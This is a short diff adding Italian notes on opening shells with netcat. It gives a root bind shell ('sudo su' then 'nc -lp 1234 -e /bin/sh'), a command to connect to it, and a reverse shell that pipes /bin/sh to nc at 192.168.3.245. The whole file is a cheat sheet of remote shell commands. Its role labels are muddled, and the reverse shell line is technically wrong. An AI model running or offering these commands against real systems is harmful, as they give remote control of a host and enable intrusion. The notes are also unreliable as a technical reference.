@@ -1,0 +1,24 @@
+Remote Shell
+
+listener: 
+prima cosa:
+sudo su
+
+nc -lp 1234 -e /bin/sh
+
+
+
+attaccante
+
+nc <ip listener> <porta>
+
+
+
+Reverse shell
+
+Listener
+nc -l -p 1234 -k
+
+
+attaccante
+/bin/sh | nc 192.168.3.245 1234
